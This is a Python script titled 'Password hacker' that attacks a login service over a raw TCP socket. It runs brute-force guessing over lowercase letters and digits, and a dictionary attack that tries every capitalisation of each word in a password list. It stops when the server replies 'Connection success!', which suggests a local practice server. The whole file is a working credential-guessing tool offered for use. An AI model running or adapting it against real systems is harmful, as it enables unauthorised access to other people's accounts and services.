import argparse
import socket
import itertools
import string


class MySocket:
    def __init__(self, host=None, port=None, password_list_location=None):
        if host is None:
            self.host = '127.0.0.1'
        else:
            self.host = host
        if port is None:
            self.port = 3030
        else:
            self.port = port
        self.password_list = None
        if password_list_location is None:
            self.load_password_list('passwords.txt')
        else:
            self.load_password_list(password_list_location)
        self.brute_pass_iterator = None
        self.dictionary_pass_iterator = None

    def send_data(self, data):
        with socket.socket() as client_socket:
            address = (self.host, self.port)
            client_socket.connect(address)
            data = data.encode()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode()
            return response

    def set_brute_force_iterable(self, length):
        lowers = string.ascii_lowercase
        numbers = string.digits
        valid_chars = list(itertools.chain(lowers, numbers))
        self.brute_pass_iterator = itertools.product(valid_chars, repeat=length)

    def load_password_list(self, password_file_location):
        pw_list = []
        with open(password_file_location, 'r', encoding='utf-8') as file:
            pw_list = file.read().split('\n')
        self.password_list = pw_list

    def brute_force(self):
        with socket.socket() as client_socket:
            address = (self.host, self.port)
            client_socket.connect(address)
            while True:
                for pw_length in range(1, 10):
                    self.set_brute_force_iterable(pw_length)
                    for pw in self.brute_pass_iterator:
                        data = ''.join(pw)
                        client_socket.send(data.encode())
                        response = client_socket.recv(1024)
                        response = response.decode()
                        if response == 'Connection success!':
                            client_socket.close()
                            return data

    def dictionary_attack(self):
        with socket.socket() as client_socket:
            address = (self.host, self.port)
            client_socket.connect(address)
            for pw in self.password_list:
                if any(letter.isalpha() for letter in pw):
                    self.generate_caps_iterator(pw)
                    for pw_variant in self.dictionary_pass_iterator:
                        variant = ''.join(pw_variant)
                        client_socket.send(variant.encode())
                        response = client_socket.recv(1024)
                        response = response.decode()
                        if response == 'Connection success!':
                            client_socket.close()
                            return variant
                else:
                    client_socket.send(pw.encode())
                    response = client_socket.recv(1024)
                    response = response.decode()
                    if response == 'Connection success!':
                        client_socket.close()
                        return pw

    def generate_caps_iterator(self, word):
        letter_iterators = []
        for letter_index in range(len(word)):
            letter_iterator = (word[letter_index].lower(), word[letter_index].upper())
            letter_iterators.append(letter_iterator)
        self.dictionary_pass_iterator = itertools.product(*letter_iterators)


def password_hacker():
    parser = argparse.ArgumentParser(description='Password hacker')
    parser.add_argument('host', nargs='?')
    parser.add_argument('port', nargs='?')
    args = parser.parse_args()
    if args.host and args.port:
        sender = MySocket(args.host, int(args.port), '..\supplemental\passwords.txt')
        # print(sender.send_data(args.data))
        # print(sender.brute_force())
        print(sender.dictionary_attack())
    else:
        print(f'Args not supplied')


if __name__ == '__main__':
    password_hacker()
